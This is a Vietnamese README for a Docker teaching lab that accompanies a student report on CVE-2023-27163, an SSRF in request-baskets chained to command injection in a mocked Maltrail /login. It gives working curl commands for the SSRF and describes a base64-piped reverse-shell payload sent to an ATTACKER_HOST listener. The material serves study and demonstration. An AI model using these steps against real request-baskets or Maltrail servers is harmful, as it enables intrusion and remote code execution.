# Hướng dẫn demo lab (theo báo cáo nghiên cứu)

Tài liệu này hướng dẫn chạy **mô hình thực nghiệm Docker** mô tả trong báo cáo **Nguyễn Đình Vinh — mã số n25chht024** (file PDF tham chiếu: `n25chht024_NguyenDinhVinh_CVE-2014-6271.pdf`).

> **Lưu ý về tên file:** Tên file PDF có đoạn `CVE-2014-6271`, nhưng **nội dung báo cáo** phân tích **CVE-2023-27163** (SSRF trên request-baskets) và **chuỗi tấn công** tới Maltrail v0.53 (RCE qua `/login`). Repo này triển khai đúng kịch bản đó; image Maltrail gốc không có sẵn trên Docker Hub nên lab dùng **`maltrail-mock`** (cùng luồng PoC, an toàn trong mạng lab).

## Mục tiêu demo

1. **Kịch bản SSRF:** Dịch vụ gateway (request-baskets bị lỗi) chuyển tiếp yêu cầu tới API chỉ nội bộ và **trả phản hồi ra ngoài** khi bật `proxy_response`.
2. **Kịch bản xâu chuỗi SSRF → RCE:** Qua basket, gửi POST tới `/login` của dịch vụ “Maltrail” (mock) với tham số `username` tiêm lệnh; trong lab có thể nhận **reverse shell** tới máy host (tuỳ cấu hình mạng).

**Chỉ chạy trong môi trường cô lập** (máy ảo, lab riêng, không Internet-facing). Không dùng trên hệ thống thật.

## Yêu cầu

- [Docker](https://docs.docker.com/get-docker/) và Docker Compose plugin
- [Node.js](https://nodejs.org/) **≥ 18** (cho script `fetch`)

## Kiến trúc lab

| Container | Vai trò | Cổng / mạng |
|-----------|---------|-------------|
| `demo_request_baskets` | request-baskets **v1.2.1** (SSRF) | `55555` → host |
| `demo_internal_api` | API nội bộ giả lập (JSON nhạy cảm tại `/flag`) | chỉ mạng Docker, cổng `9000` |
| `demo_maltrail` | **Mock** Maltrail — `POST /login` với command injection (theo báo cáo) | chỉ mạng Docker, cổng `8338` |

Mạng: `lab_internal_net` (bridge).

## Khởi động nhanh

Từ thư mục gốc repo:

```bash
docker compose up -d --build
```

Đợi vài giây để container ổn định, rồi chọn một trong hai kịch bản dưới đây.

---

## Kịch bản 1: SSRF đọc dữ liệu nội bộ

Đúng với mô tả trong báo cáo: tạo basket trỏ `forward_url` về dịch vụ nội bộ, bật `proxy_response`, gọi qua đường dẫn basket.

**Cách 1 — script (khuyến nghị):**

```bash
npm install
npm run demo:ssrf
```

**Cách 2 — thủ công (tương đương báo cáo):**

Trên Windows PowerShell, nên gọi `curl.exe` (tránh bị map sang cmdlet khác).

1. Tạo basket (thay `ssrf_relay` nếu muốn tên cố định):

```bash
curl.exe -s -X POST "http://127.0.0.1:55555/api/baskets/ssrf_relay" -H "Content-Type: application/json" -d "{\"forward_url\":\"http://internal-api:9000/\",\"proxy_response\":true,\"insecure_tls\":false,\"expand_path\":true,\"capacity\":250}"
```

2. Đọc nội dung nội bộ qua basket:

```bash
curl.exe -s "http://127.0.0.1:55555/baskets/ssrf_relay/flag"
```

**Kết quả kỳ vọng:** JSON dạng `{"message":"CVE-2023-27163 SSRF","internal_only":true}` — thể hiện dữ liệu chỉ nội bộ bị lộ qua SSRF.

---

## Kịch bản 2: Chuỗi SSRF → RCE (reverse shell trên lab)

Script `exploit.js` tạo basket trỏ tới `http://vulnerable-maltrail:8338/`, sau đó `POST` tới `/{basket}/login` với trường `username` chứa payload `echo <base64> | base64 -d | sh` (reverse shell Python trong container Maltrail mock kết nối về host).

**Một lệnh (compose + listener + exploit):**

```bash
npm install
npm start
```

Luồng này: `docker compose up -d --build` → chờ → mở listener C2 → chạy `exploit.js`. Nếu RCE thành công, shell tương tác có thể xuất hiện trên terminal.

**Tách bước:**

```bash
npm run lab
npm run listen
```

Terminal khác:

```bash
npm run exploit
```

### Biến môi trường hữu ích

| Biến | Mặc định | Ý nghĩa |
|------|-----------|---------|
| `BASKETS_URL` | `http://127.0.0.1:55555` | URL request-baskets |
| `ATTACKER_HOST` | `host.docker.internal` | Host để reverse shell kết nối (Windows/macOS Docker thường dùng được) |
| `C2_PORT` | `4444` | Cổng listener trên máy host |
| `LAB_WAIT_MS` | `8000` | Thời gian chờ sau `compose up` (khi dùng `npm start`) |
| `BASKET_NAME` | tự sinh | Tên basket (để lặp lại hoặc debug) |

Trên **Linux**, nếu `host.docker.internal` không hoạt động, thử IP bridge Docker của host (ví dụ `172.17.0.1`):

```bash
set ATTACKER_HOST=172.17.0.1
npm run exploit
```

(PowerShell: `$env:ATTACKER_HOST="172.17.0.1"`.)

---

## Dừng và dọn lab

```bash
npm run lab:down
```

hoặc:

```bash
docker compose down
```

---

## Khác với báo cáo (để trình bày minh bạch)

- **Maltrail thật v0.53** không được kéo từ Docker Hub trong cấu hình hiện tại; **`maltrail-mock`** mô phỏng `POST /login` với `shell=True` để chứng minh **cùng kiểu** tiêm lệnh, không phụ thuộc image gốc.
- Báo cáo có thêm phần **marker file** (`touch /tmp/ssrf_rce_proof`) để demo “vô hại”; repo chọn luồng **reverse shell** qua script — có thể mở rộng tương tự bằng cách đổi payload trong `scripts/payload.js` nếu cần slide “chỉ tạo file”.

---

## Tài liệu tham khảo trong báo cáo

OWASP SSRF, NVD/GitHub Advisory cho CVE-2023-27163, và phân tích RCE Maltrail v0.53 (đường dẫn đầy đủ nằm trong mục trích dẫn cuối PDF).
